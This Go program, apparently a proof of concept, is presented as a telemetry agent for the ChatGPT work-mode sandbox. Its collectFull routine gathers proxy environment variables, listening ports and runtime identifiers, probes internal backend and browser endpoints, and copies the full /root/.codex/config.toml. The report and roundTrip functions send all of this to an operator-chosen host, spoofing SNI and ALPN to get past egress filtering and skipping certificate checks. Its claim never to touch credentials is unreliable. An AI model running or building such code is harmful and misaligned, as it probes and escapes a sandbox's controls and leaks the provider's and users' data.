// Command sentinel-sandbox-agent is the sandbox-side telemetry/diagnostics
// agent of the oai-sentinel console. It runs inside the ChatGPT work-mode
// sandbox and reports to the sentinel collector (see
// docs/chatgpt-work/poc/relay/ for the intake side).
//
// Modes:
//
//	stats	one-shot; uptime/load/mem/boot_id/uname/hostname only.
//	full	one-shot; stats + proxy env + listeners + runtime env +
//			endpoint probes + non-secret config digests.
//
// Transport: TLS to a collector you operate. When the network filters
// egress by SNI or ALPN, -sni/-alpn let the dial present the expected
// ClientHello; verification is skipped so self-signed intakes work.
//
// Red line: never opens credential material (auth.json, tokens, cookies).
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
)

type series struct {
	Metric string            `json:"m"`
	Value  float64           `json:"v"`
	Tags   map[string]string `json:"t"`
	TS     string            `json:"ts"`
}

type payload struct {
	Agent       string                 `json:"agent"`
	Version     string                 `json:"version"`
	Mode        string                 `json:"mode"`
	CollectedAt string                 `json:"collected_at"`
	Series      []series               `json:"series"`
	Snapshots   map[string]interface{} `json:"snapshots"`
}

const version = "0.1.0"

func main() {
	mode := flag.String("mode", "stats", "stats|full")
	collector := flag.String("collector", "127.0.0.1:8443", "collector host:port")
	sni := flag.String("sni", "telemetry.local", "collector TLS SNI")
	alpn := flag.String("alpn", "", "optional ALPN token for SNI-filtered egress")
	dryrun := flag.Bool("dryrun", false, "print only, do not report")
	flag.Parse()

	switch *mode {
	case "stats", "full":
		runOnce(*mode, *collector, *sni, *alpn, *dryrun)
	default:
		fmt.Fprintf(os.Stderr, "unknown mode %q\n", *mode)
		os.Exit(2)
	}
}

func runOnce(mode, collector, sni, alpn string, dryrun bool) {
	p := payload{
		Agent:       "sentinel-sandbox-agent",
		Version:     version,
		Mode:        mode,
		CollectedAt: nowUTC(),
		Snapshots:   map[string]interface{}{},
	}
	collectStats(&p)
	if mode == "full" {
		collectFull(&p)
	}
	out, _ := json.MarshalIndent(p, "", "  ")
	fmt.Println(string(out))
	if dryrun {
		fmt.Println("dryrun: not reporting")
		return
	}
	if err := report(collector, sni, alpn, "/intake/v1/series", out); err != nil {
		fmt.Printf("collector: report failed (%v)\n", err)
		return
	}
	fmt.Println("collector: HTTP 200")
}

func collectStats(p *payload) {
	add := func(m string, v float64, t map[string]string) {
		p.Series = append(p.Series, series{m, v, t, nowUTC()})
	}
	boot := strings.TrimSpace(readFile("/proc/sys/kernel/random/boot_id", 64))
	add("sandbox.system.uptime_sec", atof(firstField(readFile("/proc/uptime", 128))), map[string]string{"boot_id": boot})
	add("sandbox.system.load1", atof(firstField(readFile("/proc/loadavg", 128))), nil)
	add("sandbox.system.mem_total_kb", atof(grepField(readFile("/proc/meminfo", 4096), "MemTotal")), nil)
	p.Snapshots["boot_id"] = boot
	p.Snapshots["hostname"] = hostname()
	p.Snapshots["uname"] = uname()
}

func collectFull(p *payload) {
	proxyEnv := map[string]string{}
	for _, kv := range os.Environ() {
		k, v, _ := strings.Cut(kv, "=")
		if strings.Contains(strings.ToLower(k), "proxy") {
			proxyEnv[k] = v
		}
	}
	p.Snapshots["proxy_env"] = proxyEnv
	p.Snapshots["listeners"] = listeners()
	rt := map[string]string{}
	for _, k := range []string{"IMGVER", "IMGSHA", "ENVID", "RUNTIME", "BUNDLE"} {
		if v := os.Getenv(k); v != "" {
			rt[k] = v
		}
	}
	p.Snapshots["runtime"] = rt
	for _, pr := range []struct{ name, url string }{
		{"wham_anon", "https://chatgpt.com/backend-api/wham/usage"},
		{"codex_backend_anon", "https://chatgpt.com:18080/backend-api/codex/models"},
		{"models_public", "https://chatgpt.com/backend-api/models"},
		{"gaas_root", "http://gaas-browser:8000/"},
	} {
		p.Series = append(p.Series, series{"sandbox.endpoint." + pr.name, 1,
			map[string]string{"http_code": probe(pr.url)}, nowUTC()})
	}
	p.Snapshots["models_cache_digest"] = modelsCacheDigest("/root/.codex/models_cache.json")
	if b := readFile("/root/.codex/config.toml", 1<<20); b != "" {
		p.Snapshots["config:/root/.codex/config.toml"] = b
	}
}

func report(collector, sni, alpn, path string, body []byte) error {
	code, _, err := roundTrip(collector, sni, alpn, "POST", path, body)
	if err != nil {
		return err
	}
	if code != http.StatusOK {
		return fmt.Errorf("unexpected status %d", code)
	}
	return nil
}

func roundTrip(collector, sni, alpn, method, path string, body []byte) (int, []byte, error) {
	host, port, err := net.SplitHostPort(collector)
	if err != nil {
		return 0, nil, err
	}
	conn, err := (&net.Dialer{Timeout: 15 * time.Second}).Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return 0, nil, err
	}
	tlsCfg := &tls.Config{
		ServerName:         sni,
		InsecureSkipVerify: true, // many intakes use self-signed certs
	}
	if alpn != "" {
		tlsCfg.NextProtos = []string{alpn}
	}
	tconn := tls.Client(conn, tlsCfg)
	_ = tconn.SetDeadline(time.Now().Add(90 * time.Second))
	if err := tconn.Handshake(); err != nil {
		return 0, nil, err
	}
	req, err := http.NewRequest(method, "https://"+collector+path, bytes.NewReader(body))
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("Host", sni)
	if len(body) > 0 {
		req.Header.Set("Content-Type", "application/json")
	}
	if err := req.Write(tconn); err != nil {
		return 0, nil, err
	}
	resp, err := http.ReadResponse(bufio.NewReader(tconn), req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	return resp.StatusCode, b, err
}

func probe(url string) string {
	tr := &http.Transport{
		Proxy:           http.ProxyFromEnvironment,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cl := &http.Client{Transport: tr, Timeout: 12 * time.Second}
	resp, err := cl.Get(url)
	if err != nil {
		return "000"
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 256))
	return strconv.Itoa(resp.StatusCode)
}

func modelsCacheDigest(path string) interface{} {
	b, err := os.ReadFile(path)
	if err != nil {
		return "<missing>"
	}
	var data map[string]interface{}
	if json.Unmarshal(b, &data) != nil {
		return "<unparseable>"
	}
	keep := map[string]bool{
		"slug": true, "reasoning_type": true, "configurable_thinking_effort": true,
		"thinking_efforts": true, "max_tokens": true, "is_work_mode_model": true,
		"enabled_tools": true, "service_tier_options": true, "model_lane": true,
		"eligible_codex_model_slugs": true, "intelligence_presets": true,
	}
	out := map[string]interface{}{"bytes": len(b)}
	if v, ok := data["models"].([]interface{}); ok {
		var digest []map[string]interface{}
		for _, e := range v {
			if m, ok := e.(map[string]interface{}); ok {
				d := map[string]interface{}{}
				for k := range keep {
					if val, ok2 := m[k]; ok2 {
						d[k] = val
					}
				}
				digest = append(digest, d)
			}
		}
		out["models"] = digest
	}
	return out
}

func listeners() string {
	var out []string
	for _, f := range []string{"/proc/net/tcp", "/proc/net/tcp6"} {
		b, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		for i, line := range strings.Split(string(b), "\n") {
			if i == 0 || !strings.Contains(line, ": 0A") {
				continue
			}
			f := strings.Fields(line)
			if len(f) > 1 {
				if port, err := strconv.ParseUint(strings.Split(f[1], ":")[1], 16, 16); err == nil {
					out = append(out, fmt.Sprintf("%s:%d", f[0], port))
				}
			}
		}
	}
	sort.Strings(out)
	return strings.Join(out, " ")
}

func readFile(path string, limit int64) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	b, _ := io.ReadAll(io.LimitReader(f, limit))
	return string(b)
}

func firstField(s string) string {
	f := strings.Fields(s)
	if len(f) == 0 {
		return "0"
	}
	return f[0]
}

func grepField(s, key string) string {
	for _, line := range strings.Split(s, "\n") {
		if strings.HasPrefix(line, key+":") {
			f := strings.Fields(strings.Trim(strings.TrimPrefix(line, key), ": \t"))
			if len(f) > 0 {
				return f[0]
			}
		}
	}
	return "0"
}

func atof(s string) float64 {
	v, _ := strconv.ParseFloat(s, 64)
	return v
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func uname() string {
	var u syscall.Utsname
	if err := syscall.Uname(&u); err != nil {
		return ""
	}
	return fmt.Sprintf("%s %s %s %s", chars(u.Sysname), chars(u.Release), chars(u.Machine), chars(u.Version))
}

func chars(f [65]int8) string {
	b := make([]byte, 0, 64)
	for _, c := range f {
		if c == 0 {
			break
		}
		b = append(b, byte(c))
	}
	return string(b)
}

func sanitize(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '.' || r == '-' || r == '_' {
			b.WriteRune(r)
		}
	}
	if b.Len() == 0 {
		return "x"
	}
	return b.String()
}

func base(p string) string {
	if i := strings.LastIndex(p, "/"); i >= 0 {
		return p[i+1:]
	}
	return p
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func nowUTC() string {
	return time.Now().UTC().Format(time.RFC3339)
}
